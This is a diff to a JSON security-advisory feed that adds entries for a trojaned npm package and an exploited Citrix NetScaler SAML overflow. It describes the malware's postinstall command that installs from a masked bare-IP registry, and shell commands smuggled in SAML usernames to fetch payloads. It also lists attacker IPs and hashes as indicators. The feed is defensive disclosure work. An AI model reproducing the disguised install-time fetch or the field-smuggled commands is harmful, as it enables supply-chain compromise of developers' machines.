@@ -1,6 +1,6 @@
 {
   "format": 1,
-  "updated": "2026-10-23T04:16:29Z",
+  "updated": "2026-10-23T10:17:03Z",
   "window": "2026-10-09 to 2026-10-23",
   "advisories": [
     {
@@ -34,6 +34,45 @@
       "sources": [
         "https://github.com/advisories/GHSA-xvgg-qjjh-gq34",
         "https://www.npmjs.com/package/@tekmidian/pai"
+      ]
+    },
+    {
+      "id": "conduitops-logview-archive-malware",
+      "title": "Malware in @conduitops/logview-archive (npm): postinstall fetches and runs a payload from a disguised, masked registry URL",
+      "date": "2026-10-22",
+      "severity": "critical",
+      "exploited": true,
+      "cves": [],
+      "summary": "Version 1.0.1 of @conduitops/logview-archive is a trojan. Its postinstall hook runs install.js, which shells out to 'npm install @conduit/logview-cli@2.2.0 --registry <decoded URL>', where the URL sits as a base64+XOR-masked string (key c0ndu1t-ops) in lib/toolchain.json and is decoded in memory by lib/origin.js. The decoded registry is a plain-HTTP bare IP - http://139.196.94.195:8080/dl/npm/ - not the public registry and nothing like the package's claimed conduit.internal provenance, so npm fetches and executes the lifecycle scripts of whatever package the attacker serves there: arbitrary install-time code execution on the installer's host. A comment in lib/origin.js says the masking is deliberate, leaving no readable address in the download. Reported by Amazon Inspector (IN-MAL-2026-021570) and published in the OSSF malicious-packages feed.",
+      "affected": "@conduitops/logview-archive 1.0.1 (npm). There is no patched build: the package should be removed.",
+      "fixed": [],
+      "checks": [
+        {
+          "kind": "npm",
+          "label": "@conduitops/logview-archive",
+          "package": "@conduitops/logview-archive",
+          "bad": [
+            "1.0.1"
+          ]
+        }
+      ],
+      "patch": [
+        "Remove the package (npm uninstall @conduitops/logview-archive; delete it from lockfiles and CI images) and reinstall dependencies from the public registry",
+        "Treat the machine as compromised: rotate its secrets from a different machine and rebuild from a clean image"
+      ],
+      "mitigation": [
+        "Build hosts should not reach a plain-HTTP bare-IP registry: block 139.196.94.195 outbound, and pin npm to the public registry with an .npmrc scope check"
+      ],
+      "iocs": [
+        "139.196.94.195:8080 (the masked registry the postinstall fetches from)",
+        "install.js sha256 0d11efbb0880f2b9f3d4c8f073cf4ddddb105badc34ffaed48ae76d59a0609a8",
+        "lib/origin.js sha256 4a2485296ad2178b7bf07ebba6d13b300728582dd9ca673aa3e262d46e49c44e",
+        "logview-archive-1.0.1.tgz sha1 0b49478bb2f4e40d6e34adee09daa9c8f8c73fc8"
+      ],
+      "sources": [
+        "https://osv.dev/vulnerability/MAL-2026-18183",
+        "https://vulnerability.circl.lu/vuln/MAL-2026-18183",
+        "https://www.npmjs.com/package/@conduitops/logview-archive"
       ]
     },
     {
@@ -1092,6 +1131,43 @@
         "https://docs.gitlab.com/releases/patches/patch-release-gitlab-19-5-1-released/",
         "https://docs.gitlab.com/releases/patches/patch-release-gitlab-19-4-2-released/",
         "https://x.com/TheHackersNews/status/2112981939984671090"
+      ]
+    },
+    {
+      "id": "citrix-netscaler-88779",
+      "title": "Citrix NetScaler ADC/Gateway before 14.1-73.41 / 13.1-64.28: memory overflow in SAML auth, exploited to reboot internet-facing appliances (CVE-2026-88779)",
+      "date": "2026-10-04",
+      "severity": "high",
+      "exploited": true,
+      "cves": [
+        "CVE-2026-88779"
+      ],
+      "summary": "A memory buffer overflow in NetScaler's SAML authentication path (CWE-119, CVSS v4 8.7) crashes the appliance; triggered repeatedly the service stays down. Citrix says it has observed targeted attacks on unmitigated deployments and rates the impact availability-only, but the field reports are nastier: administrators saw crafted SAML usernames carrying shell commands that tried to download and run a payload from 213.209.159[.]55, patched appliances rebooted in loops, Kevin Beaumont found a honeypot running a downloaded binary, and watchTowr reproduced the flaw. CISA's KEV catalog added it on October 4, the day Citrix published the bulletin and emergency builds, with a federal deadline of October 7; attempts seen so far look like broad spraying. Applies to appliances configured as a SAML service provider or SAML identity provider; Secure Private Access Hybrid deployments on NetScaler instances are affected too. Appliances already updated for the earlier NetScaler flaws (CVE-2026-88771 through 88778) need this upgrade as well. This entry carries the October 4 date because the feed's scan window missed it then; it is still exploited and still unpatched on many appliances.",
+      "affected": "NetScaler ADC and NetScaler Gateway 14.1 before 14.1-73.41, 13.1 before 13.1-64.28, ADC FIPS before 14.1-73.41 FIPS, and ADC FIPS/NDcPP before 13.1-37.282 - when configured with SAML authentication on a Gateway or AAA virtual server (an 'add authentication samlAction' or 'add authentication samlIdPProfile' entry in the running config).",
+      "fixed": [
+        "14.1-73.41",
+        "13.1-64.28",
+        "14.1-73.41 FIPS",
+        "13.1-37.282"
+      ],
+      "checks": [],
+      "patch": [
+        "Upgrade to 14.1-73.41 (FIPS: 14.1-73.41 FIPS; 13.1 line: 13.1-64.28; ADC FIPS/NDcPP on 13.1: 13.1-37.282) from Citrix's downloads, then reboot the appliance",
+        "Secure Private Access Hybrid: upgrade the NetScaler instances as well; Citrix-managed cloud services are already updated"
+      ],
+      "mitigation": [
+        "Until upgraded: enable Citrix's Global Deny List signatures (NetScaler Console 'Virtual patching' on; default-on from 14.1-60.52 and 13.1-63.21; check 'show appfw signatures' shows Encrypted Version at least v24)",
+        "Restrict management and SAML endpoints where the topology allows (ACLs on the management interface), and review logs for repeated reboots, nsaaad crashes and unexpected files",
+        "No SAML action configured means the vendor's precondition is absent - confirm before you deprioritize the upgrade"
+      ],
+      "iocs": [
+        "213.209.159.55 (payload host seen in crafted SAML usernames)"
+      ],
+      "sources": [
+        "https://support.citrix.com/support-home/kbsearch/article?articleNumber=CTX697174",
+        "https://community.citrix.com/techzone-blogs/110_security-updates/understanding-and-addressing-cve-2026-88779-in-citrix-netscaler-adc-and-citrix-netscaler-gateway/",
+        "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
+        "https://www.cert.ug/index.php/citrix-netscaler-gets-another-exploited-zero-day-and-last-weeks-patches-do-not-cover-it-cve-2026"
       ]
     },
     {
